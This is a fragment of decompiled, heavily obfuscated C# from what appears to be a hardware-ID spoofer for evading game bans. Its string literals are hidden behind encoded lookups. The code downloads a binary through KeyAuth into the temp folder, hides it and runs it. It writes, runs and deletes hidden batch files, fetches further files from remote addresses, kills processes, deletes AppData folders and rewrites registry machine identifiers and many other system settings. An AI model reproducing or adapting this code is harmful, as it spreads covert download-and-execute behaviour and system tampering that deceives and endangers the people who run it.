						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 57591));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 59191));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 59384));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 60592));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 57472));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 59191));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 58091));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 61163));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 62511));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 59730));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 61163));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 57576));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 61930));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 58091));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 59376));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 58091));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 63512));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 60692));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 63496));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 63471));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 63605));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 62077));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 58019));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 62296));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 58320));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 63561));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 59252));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 59517));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 59931));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 58487));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 62180));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 62125));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 58541));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 61734));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 58141));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 58757));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 62127));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 60615));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 59857));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 62371));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 63512));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 60774));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 58748));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 63475));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 60099));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 63398));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 58030));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 59155));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 58860));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 57888));
						streamWriter3.WriteLine(global::i.a("", 59089));
					}
					Process process3 = Process.Start(text3);
					process3.WaitForExit();
					File.Delete(text3);
					Main.HWIDclick();
					Main.XBOXclick();
					Main.PCclick();
					Main.Diskclick();
					Main.FiveM();
					Main.bi();
					string path2 = global::i.a("", 59056);
					if (!Directory.Exists(path2))
					{
						Directory.CreateDirectory(path2);
					}
					if (File.Exists(global::i.a("", 58616)))
					{
						Process.Start(global::i.a("", 58616));
						File.Delete(global::i.a("", 58616));
					}
					else
					{
						string text4 = global::i.a("", 58616);
						using (StreamWriter streamWriter4 = File.CreateText(text4))
						{
							streamWriter4.WriteLine(global::i.a("", 57802));
						}
						Process process4 = new Process();
						process4.StartInfo.FileName = text4;
						this.d.Add(process4);
						File.SetAttributes(global::i.a("", 58616), FileAttributes.Hidden);
						process4.Start();
						Thread.Sleep(500);
						File.Delete(global::i.a("", 58616));
					}
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
					string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					if (Directory.Exists(folderPath + global::i.a("", 59160)))
					{
						Directory.Delete(folderPath + global::i.a("", 59160), true);
					}
					if (Directory.Exists(folderPath + global::i.a("", 57463)))
					{
						Directory.Delete(folderPath + global::i.a("", 57463), true);
					}
					if (Directory.Exists(folderPath + global::i.a("", 57969)))
					{
						Directory.Delete(folderPath + global::i.a("", 57969), true);
					}
					if (Directory.Exists(folderPath + global::i.a("", 58374)))
					{
						Directory.Delete(folderPath + global::i.a("", 58374), true);
					}
					if (Directory.Exists(folderPath + global::i.a("", 58553)))
					{
						Directory.Delete(folderPath + global::i.a("", 58553), true);
					}
					Directory.Exists(folderPath + global::i.a("", 62582));
					if (Directory.Exists(folderPath2 + global::i.a("", 60912)))
					{
						Directory.Delete(folderPath2 + global::i.a("", 60912), true);
					}
					string path3 = global::i.a("", 59056);
					if (!Directory.Exists(path3))
					{
						Directory.CreateDirectory(path3);
					}
					if (File.Exists(global::i.a("", 63049)))
					{
						new SoundPlayer(global::i.a("", 63049)).Play();
					}
					else
					{
						string address = global::i.a("", 58559);
						string fileName = global::i.a("", 63049);
						WebClient webClient = new WebClient();
						webClient.DownloadFile(address, fileName);
						File.SetAttributes(global::i.a("", 63049), FileAttributes.Hidden);
						new SoundPlayer(global::i.a("", 63049)).Play();
					}
					MessageBox.Show(global::i.a("", 62609), global::i.a("", 59004), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else if (this.ao.Text == global::i.a("", 63691))
				{
					base.Hide();
					Process[] processesByName = Process.GetProcessesByName(global::i.a("", 61704));
					if (processesByName.Length != 0)
					{
						foreach (Process process5 in Process.GetProcessesByName(global::i.a("", 61704)))
						{
							process5.Kill();
						}
					}
					if (Directory.Exists(global::i.a("", 60769)))
					{
						Directory.Delete(global::i.a("", 60769));
						Directory.CreateDirectory(global::i.a("", 60769));
					}
					Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
					Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					new Process
					{
						StartInfo = new ProcessStartInfo
						{
							WindowStyle = ProcessWindowStyle.Hidden,
							FileName = global::i.a("", 59258),
							Arguments = global::i.a("", 59125) + this.br.Text
						}
					}.Start();
					new Process
					{
						StartInfo = 
						{
							FileName = global::i.a("", 59258),
							CreateNoWindow = true,
							RedirectStandardInput = true,
							RedirectStandardOutput = true,
							UseShellExecute = false,
							Verb = global::i.a("", 59964),
							Arguments = global::i.a("", 57458)
						}
					}.Start();
					base.Hide();
					System.Timers.Timer timer = new System.Timers.Timer(50.0);
					timer.AutoReset = true;
					timer.Elapsed += Main.MyMethod2;
					timer.Start();
				}
				else if (this.ao.Text == global::i.a("", 62790))
				{
					string tempPath = Path.GetTempPath();
					byte[] bytes = Login.KeyAuthApp.download(global::i.a("", 60423));
					File.WriteAllBytes(tempPath + this.c + global::i.a("", 58592), bytes);
					File.SetAttributes(tempPath + this.c + global::i.a("", 58592), FileAttributes.Hidden);
					Process.Start(tempPath + this.c + global::i.a("", 58592));
					Thread.Sleep(2500);
					this.xynwbyzia();
					d d2 = new d();
					d2.b();
					Main.HWIDclick();
					string value = string.Concat(new string[]
					{
						Main.GenerateString(5),
						global::i.a("", 58405),
						Main.GenerateString(5),
						global::i.a("", 58405),
						Main.GenerateString(5),
						global::i.a("", 58405),
						Main.GenerateString(5)
					});
					RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(global::i.a("", 61151), true);
					registryKey.SetValue(global::i.a("", 63233), value);
					registryKey.Close();
					Main.InstallDate();
					Main.Disk();
					Main.HWIDclick();
					Main.XBOXclick();
					Main.PCclick();
					Main.Diskclick();
					Main.bi();
					Main.SpoofPCName();
					string path4 = global::i.a("", 59056);
					if (!Directory.Exists(path4))
					{
						Directory.CreateDirectory(path4);
					}
					if (File.Exists(global::i.a("", 58616)))
					{
						Process.Start(global::i.a("", 58616));
					}
					else
					{
						string text5 = global::i.a("", 58616);
						using (StreamWriter streamWriter5 = File.CreateText(text5))
						{
							streamWriter5.WriteLine(global::i.a("", 57802));
						}
						Process process6 = new Process();
						process6.StartInfo.FileName = text5;
						this.d.Add(process6);
						File.SetAttributes(global::i.a("", 58616), FileAttributes.Hidden);
						process6.Start();
					}
					if (File.Exists(global::i.a("", 59144)))
					{
						File.Delete(global::i.a("", 59144));
					}
					if (File.Exists(global::i.a("", 63228)))
					{
						File.Delete(global::i.a("", 63228));
					}
					string text6 = this.bh.Text;
					string path5 = global::i.a("", 62237);
					if (!Directory.Exists(path5))
					{
						Directory.CreateDirectory(path5);
					}
					if (File.Exists(global::i.a("", 59144)))
					{
						string text7 = global::i.a("", 63228);
						using (StreamWriter streamWriter6 = File.CreateText(text7))
						{
							streamWriter6.WriteLine(string.Concat(new string[]
							{
								global::i.a("", 62038),
								text6,
								global::i.a("", 61082),
								Main.DiskGen(4),
								global::i.a("", 58405),
								Main.DiskGen(4),
								global::i.a("", 62637)
							}));
						}
						Process process7 = new Process();
						process7.StartInfo.FileName = text7;
						this.d.Add(process7);
						File.SetAttributes(global::i.a("", 63228), FileAttributes.Hidden);
						process7.Start();
						File.Delete(global::i.a("", 59144));
						File.Delete(global::i.a("", 63228));
						Directory.Delete(path5);
					}
					else
					{
						string text8 = global::i.a("", 63228);
						using (StreamWriter streamWriter7 = File.CreateText(text8))
						{
							streamWriter7.WriteLine(string.Concat(new string[]
							{
								global::i.a("", 62038),
								text6,
								global::i.a("", 61082),
								Main.DiskGen(4),
								global::i.a("", 58405),
								Main.DiskGen(4),
								global::i.a("", 62637)
							}));
						}
						Process process8 = new Process();
						process8.StartInfo.FileName = text8;
						this.d.Add(process8);
						File.SetAttributes(global::i.a("", 63228), FileAttributes.Hidden);
						process8.Start();
						File.Delete(global::i.a("", 59144));
						File.Delete(global::i.a("", 63228));
						Directory.Delete(path5);
					}
					MessageBox.Show(global::i.a("", 59242), global::i.a("", 59004), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else if (this.ao.Text == global::i.a("", 59294))
				{
					foreach (string text9 in Registry.LocalMachine.OpenSubKey(global::i.a("", 60029)).GetSubKeyNames())
					{
						foreach (string text10 in Registry.LocalMachine.OpenSubKey(global::i.a("", 59266) + text9).GetSubKeyNames())
						{
							RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
							{
								global::i.a("", 59266),
								text9,
								global::i.a("", 58185),
								text10,
								global::i.a("", 61478)
							}), true);
							if (registryKey2 != null && registryKey2.GetValue(global::i.a("", 60628)).ToString() == global::i.a("", 58106))
							{
								string value2 = Main.RandomId(14);
								string value3 = Main.RandomId(14);
								registryKey2.SetValue(global::i.a("", 58416), Encoding.UTF8.GetBytes(value3));
								registryKey2.SetValue(global::i.a("", 59485), value2);
								registryKey2.SetValue(global::i.a("", 59484), Encoding.UTF8.GetBytes(value2));
								registryKey2.SetValue(global::i.a("", 62127), value3);
							}
						}
						RegistryKey registryKey3 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(global::i.a("", 60705), true);
						registryKey3.SetValue(global::i.a("", 61094), global::i.a("", 59661) + Main.GenerateString(6));
						registryKey3.Close();
						string.Concat(new string[]
						{
							Main.GenerateString(5),
							global::i.a("", 58405),
							Main.GenerateString(5),
							global::i.a("", 58405),
							Main.GenerateString(5),
							global::i.a("", 58405),
							Main.GenerateString(5)
						});
						string path6 = global::i.a("", 57759);
						if (!Directory.Exists(path6))
						{
							Directory.CreateDirectory(path6);
						}
						Main.HWIDclick();
						string path7 = global::i.a("", 57759);
						if (!Directory.Exists(path7))
						{
							Directory.CreateDirectory(path7);
						}
						if (File.Exists(global::i.a("", 60011)))
						{
							new SoundPlayer(global::i.a("", 60011)).Play();
						}
						else
						{
							string address2 = global::i.a("", 60682);
							string fileName2 = global::i.a("", 60011);
							WebClient webClient2 = new WebClient();
							webClient2.DownloadFile(address2, fileName2);
							File.SetAttributes(global::i.a("", 60011), FileAttributes.Hidden);
							new SoundPlayer(global::i.a("", 60011)).Play();
						}
						MessageBox.Show(global::i.a("", 62433) + Main.CurrentProductID(), global::i.a("", 59004), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					}
				}
				else if (this.ao.Text == global::i.a("", 61545))
				{
					Path.GetTempPath();
					d d3 = new d();
					d3.b();
					Main.HWIDclick();
					string value4 = string.Concat(new string[]
					{
						Main.GenerateString(5),
						global::i.a("", 58405),
						Main.GenerateString(5),
						global::i.a("", 58405),
						Main.GenerateString(5),
						global::i.a("", 58405),
						Main.GenerateString(5)
					});
					RegistryKey registryKey4 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(global::i.a("", 61151), true);
					registryKey4.SetValue(global::i.a("", 63233), value4);
					registryKey4.Close();
					Main.InstallDate();
					Main.Disk();
					Main.HWIDclick();
					Main.XBOXclick();
					Main.PCclick();
					Main.Diskclick();
					Main.bi();
					Main.SpoofPCName();
					string path8 = global::i.a("", 59056);
					if (!Directory.Exists(path8))
					{
						Directory.CreateDirectory(path8);
					}
					if (File.Exists(global::i.a("", 58616)))
					{
						Process.Start(global::i.a("", 58616));
					}
					else
					{
						string text11 = global::i.a("", 58616);
						using (StreamWriter streamWriter8 = File.CreateText(text11))
						{
							streamWriter8.WriteLine(global::i.a("", 57802));
						}
						Process process9 = new Process();
						process9.StartInfo.FileName = text11;
						this.d.Add(process9);
						File.SetAttributes(global::i.a("", 58616), FileAttributes.Hidden);
						process9.Start();
					}
					if (File.Exists(global::i.a("", 59144)))
					{
						File.Delete(global::i.a("", 59144));
					}
					if (File.Exists(global::i.a("", 63228)))
					{
						File.Delete(global::i.a("", 63228));
					}
					string text12 = this.bh.Text;
					string path9 = global::i.a("", 62237);
					if (!Directory.Exists(path9))
					{
						Directory.CreateDirectory(path9);
					}
					if (File.Exists(global::i.a("", 59144)))
					{
						string text13 = global::i.a("", 63228);
						using (StreamWriter streamWriter9 = File.CreateText(text13))
						{
							streamWriter9.WriteLine(string.Concat(new string[]
							{
								global::i.a("", 62038),
								text12,
								global::i.a("", 61082),
								Main.DiskGen(4),
								global::i.a("", 58405),
								Main.DiskGen(4),
								global::i.a("", 62637)
							}));
						}
						Process process10 = new Process();
						process10.StartInfo.FileName = text13;
						this.d.Add(process10);
						File.SetAttributes(global::i.a("", 63228), FileAttributes.Hidden);
						process10.Start();
						File.Delete(global::i.a("", 59144));
						File.Delete(global::i.a("", 63228));
						Directory.Delete(path9);
					}
					else
					{
						string text14 = global::i.a("", 63228);
						using (StreamWriter streamWriter10 = File.CreateText(text14))
						{
							streamWriter10.WriteLine(string.Concat(new string[]
							{
								global::i.a("", 62038),
								text12,
								global::i.a("", 61082),
								Main.DiskGen(4),
								global::i.a("", 58405),
								Main.DiskGen(4),
								global::i.a("", 62637)
							}));
						}
						Process process11 = new Process();
						process11.StartInfo.FileName = text14;
						this.d.Add(process11);
						File.SetAttributes(global::i.a("", 63228), FileAttributes.Hidden);
						process11.Start();
						File.Delete(global::i.a("", 59144));
						File.Delete(global::i.a("", 63228));
						Directory.Delete(path9);
					}
					MessageBox.Show(global::i.a("", 57519), global::i.a("", 59004), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else if (this.ao.Text == global::i.a("", 62922))
				{
					string path10 = global::i.a("", 57759);
					if (!Directory.Exists(path10))
					{
						Directory.CreateDirectory(path10);
					}
					if (File.Exists(global::i.a("", 59789)))
					{
						new SoundPlayer(global::i.a("", 59789)).Play();
						MessageBox.Show(global::i.a("", 61696), global::i.a("", 59004), MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					else
					{
						string address3 = global::i.a("", 63189);
						string fileName3 = global::i.a("", 59789);
						WebClient webClient3 = new WebClient();
						webClient3.DownloadFile(address3, fileName3);
						File.SetAttributes(global::i.a("", 59789), FileAttributes.Hidden);
						new SoundPlayer(global::i.a("", 59789)).Play();
						MessageBox.Show(global::i.a("", 61696), global::i.a("", 59004), MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
				}
				else
				{
					MessageBox.Show(global::i.a("", 61919), global::i.a("", 59004), MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600005B RID: 91 RVA: 0x000021B8 File Offset: 0x000003B8
		private void ac(object sender, EventArgs e)
		{
			this.ai.BringToFront();
		}

		// Token: 0x0600005C RID: 92 RVA: 0x000021C5 File Offset: 0x000003C5
		private void ad(object sender, EventArgs e)
		{
			this.ap.BringToFront();
		}

		// Token: 0x0600005D RID: 93 RVA: 0x000021A9 File Offset: 0x000003A9
		private void ae(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600005E RID: 94 RVA: 0x000021A9 File Offset: 0x000003A9
		private void af(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005F RID: 95 RVA: 0x000021D2 File Offset: 0x000003D2
		private void ag(object sender, EventArgs e)
		{
			Main.HWIDclick();
			MessageBox.Show(global::i.a("", 61724), global::i.a("", 61986), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00007EFC File Offset: 0x000060FC
		public void xynwbyzia()
		{
			string tempPath = Path.GetTempPath();
			if (Process.GetProcessesByName(this.c + global::i.a("", 57423)).Length == 0)
			{
				File.Delete(tempPath + this.c + global::i.a("", 57423));
			}
			else
			{
				Thread.Sleep(5000);
				this.xynwbyzia();
			}
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00007F68 File Offset: 0x00006168
		public static string GenerateDate(int size)
		{
			char[] array = new char[size];
			for (int i = 0; i < size; i++)
			{
				array[i] = global::i.a("", 61444)[Main.random.Next(global::i.a("", 61444).Length)];
			}
			return new string(array);
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00007FC8 File Offset: 0x000061C8
		private void ah(object sender, EventArgs e)
		{
			string value = Main.GenerateDate(8);
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(global::i.a("", 61045), true);
			registryKey.SetValue(global::i.a("", 59622), value);
			registryKey.Close();
			MessageBox.Show(global::i.a("", 58995), global::i.a("", 63108), MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00008044 File Offset: 0x00006244
		private void ai(object sender, EventArgs e)
		{
			string value = Main.GenerateDate(8);
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(global::i.a("", 59317), true);
			registryKey.SetValue(global::i.a("", 62474), value);
			registryKey.Close();
			MessageBox.Show(global::i.a("", 58900), global::i.a("", 62678), MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x06000064 RID: 100 RVA: 0x000080C0 File Offset: 0x000062C0
		private void aj(object sender, EventArgs e)
		{
			Registry.SetValue(global::i.a("", 61664), global::i.a("", 58184), global::i.a("", 60122), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 61664), global::i.a("", 61311), global::i.a("", 60122), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 62226), global::i.a("", 60332), global::i.a("", 59686), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58823), global::i.a("", 60108), global::i.a("", 59686), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62819), global::i.a("", 58146), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62820), "", global::i.a("", 57687));
			Registry.SetValue(global::i.a("", 63109), "", global::i.a("", 59193));
			Registry.SetValue(global::i.a("", 61221), global::i.a("", 63349), global::i.a("", 61856));
			Registry.SetValue(global::i.a("", 61221), global::i.a("", 57835), global::i.a("", 58728));
			Registry.SetValue(global::i.a("", 61221), global::i.a("", 62555), global::i.a("", 59686));
			Registry.SetValue(global::i.a("", 61221), global::i.a("", 59730), global::i.a("", 58442));
			Registry.SetValue(global::i.a("", 61221), global::i.a("", 57514), global::i.a("", 58728));
			Registry.SetValue(global::i.a("", 62086), global::i.a("", 63711), global::i.a("", 59686));
			Registry.SetValue(global::i.a("", 57453), global::i.a("", 58785), global::i.a("", 63413), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57453), global::i.a("", 59478), global::i.a("", 63413), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57453), global::i.a("", 61678), global::i.a("", 63413), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57453), global::i.a("", 59784), global::i.a("", 63413), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57453), global::i.a("", 57584), global::i.a("", 63413), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62639), global::i.a("", 57745), global::i.a("", 58442));
			Registry.SetValue(global::i.a("", 61009), global::i.a("", 58840), global::i.a("", 60221), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61065), global::i.a("", 58840), global::i.a("", 60221), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57898), global::i.a("", 58840), global::i.a("", 60221), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61651), global::i.a("", 58840), global::i.a("", 60221), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57564), global::i.a("", 63673), global::i.a("", 59686), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57564), global::i.a("", 58551), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62094), global::i.a("", 60823), 1, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58514), global::i.a("", 63251), 8, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58514), global::i.a("", 58157), 6, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58514), global::i.a("", 57698), global::i.a("", 59349), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 58514), global::i.a("", 63666), global::i.a("", 59349), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 59620), global::i.a("", 63251), 0, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59620), global::i.a("", 58157), 8, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59620), global::i.a("", 57698), global::i.a("", 61181), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 59620), global::i.a("", 63666), global::i.a("", 59349), RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 62199), true).DeleteValue(global::i.a("", 58184), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 62199), true).DeleteValue(global::i.a("", 61311), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 61618), true).DeleteValue(global::i.a("", 60332), false);
			Registry.SetValue(global::i.a("", 58823), global::i.a("", 60108), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62819), global::i.a("", 58146), global::i.a("", 59686), RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree(global::i.a("", 57474), false);
			Registry.ClassesRoot.DeleteSubKeyTree(global::i.a("", 62311), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 59590), true).DeleteValue(global::i.a("", 63349), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 59590), true).DeleteValue(global::i.a("", 57835), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 59590), true).DeleteValue(global::i.a("", 59730), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 59590), true).DeleteValue(global::i.a("", 57514), false);
			Registry.SetValue(global::i.a("", 61221), global::i.a("", 62555), global::i.a("", 60741));
			Registry.SetValue(global::i.a("", 62086), global::i.a("", 63711), global::i.a("", 60741));
			Registry.CurrentUser.OpenSubKey(global::i.a("", 57531), true).DeleteValue(global::i.a("", 58785), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 57531), true).DeleteValue(global::i.a("", 59478), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 57531), true).DeleteValue(global::i.a("", 61678), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 57531), true).DeleteValue(global::i.a("", 59784), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 57531), true).DeleteValue(global::i.a("", 57584), false);
			Registry.SetValue(global::i.a("", 62639), global::i.a("", 57745), global::i.a("", 61411));
			Registry.SetValue(global::i.a("", 61009), global::i.a("", 58840), global::i.a("", 59222), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57898), global::i.a("", 58840), global::i.a("", 59222), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61651), global::i.a("", 58840), global::i.a("", 59222), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57564), global::i.a("", 63673), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57564), global::i.a("", 58551), global::i.a("", 59686), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62094), global::i.a("", 60823), 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 59120), true).DeleteValue(global::i.a("", 63251), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 59120), true).DeleteValue(global::i.a("", 58157), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 59120), true).DeleteValue(global::i.a("", 57698), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 59120), true).DeleteValue(global::i.a("", 63666), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 57794), true).DeleteValue(global::i.a("", 63251), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 57794), true).DeleteValue(global::i.a("", 58157), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 57794), true).DeleteValue(global::i.a("", 57698), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 57794), true).DeleteValue(global::i.a("", 63666), false);
			Registry.SetValue(global::i.a("", 60512), global::i.a("", 61545), global::i.a("", 59686), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59689), global::i.a("", 61841), global::i.a("", 59686), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 63664), global::i.a("", 62183), global::i.a("", 59686), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 63664), global::i.a("", 63701), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 63664), global::i.a("", 60047), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 63664), global::i.a("", 63124), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61510), global::i.a("", 57979), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61612), global::i.a("", 63271), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 63567), global::i.a("", 58840), global::i.a("", 59686), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62778), global::i.a("", 60586), 0);
			Registry.SetValue(global::i.a("", 59093), global::i.a("", 63676), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59093), global::i.a("", 58120), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59093), global::i.a("", 62269), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59093), global::i.a("", 61066), global::i.a("", 59686), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60132), global::i.a("", 57745), global::i.a("", 61856), RegistryValueKind.DWord);
